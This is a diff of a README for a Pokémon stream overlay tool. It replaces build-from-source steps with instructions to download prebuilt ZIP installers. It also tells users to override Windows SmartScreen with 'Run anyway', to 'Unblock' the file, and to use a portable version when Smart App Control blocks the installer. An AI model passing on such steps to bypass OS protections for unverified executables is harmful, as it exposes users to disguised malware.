@@ -29,31 +29,25 @@ Includes transparent OBS browser sources for active Pokémon targets, current ro
 
 ---
 
-## Installation & Setup
+## 🚀 Installation & Running
 
-1. Clone the repository:
+Choose whichever setup option fits your system:
 
-       git clone https://github.com/marmadukian/pokemon-stream-director.git
-       cd pokemon-stream-director
+### Option 1: Installer (Recommended)
+1. Download **`PokemonHuntingTool.zip`**.
+2. Run the installer and follow the setup prompts.
+   * *If Windows SmartScreen prompts you, click **More info** -> **Run anyway**.*
+3. Launch the application from the desktop shortcut.
 
-2. Install dependencies:
+---
 
-       pip install pokebase
+### Option 2: Portable ZIP (Zero-Install / For Smart App Control)
+If Windows 11 Smart App Control (SAC) blocks the installer, use this standalone version:
 
-3. Run the server:
-
-       python pkmn_server.py
-
-4. Note the local IP printed in your terminal:
-   The server will print the active host and port (default 1350). Access the UI from any device on your local network:
-   * **Dashboard:** `http://<YOUR-PC-IP>:1350/`
-   * **Mobile Remote:** `http://<YOUR-PC-IP>:1350/remote`
-   * **OBS Target Overlay:** `http://localhost:1350/obs/target_overlay`
-   * **OBS Team Overlay:** `http://localhost:1350/obs/team`
-   * **OBS Shiny Overlay:** `http://localhost:1350/obs/shiny`
-
-5. Initial Cache Build:
-   On initial launch, a low-priority background worker prefetches and caches National Dex and encounter data locally (~15–30 minutes). The dashboard is functional immediately; subsequent launches and route lookups load near-instantly from disk once cached.
+1. Download **`Pokemon Stream Director v1.0.zip`**.
+2. **Important:** Right-click the `.zip` file -> select **Properties** -> check **Unblock** at the bottom -> click **Apply**.
+3. Extract the folder anywhere (e.g., Desktop or Downloads).
+4. Run **`RunServer.bat`** to verify dependencies and start the local server.
 
 ---
 
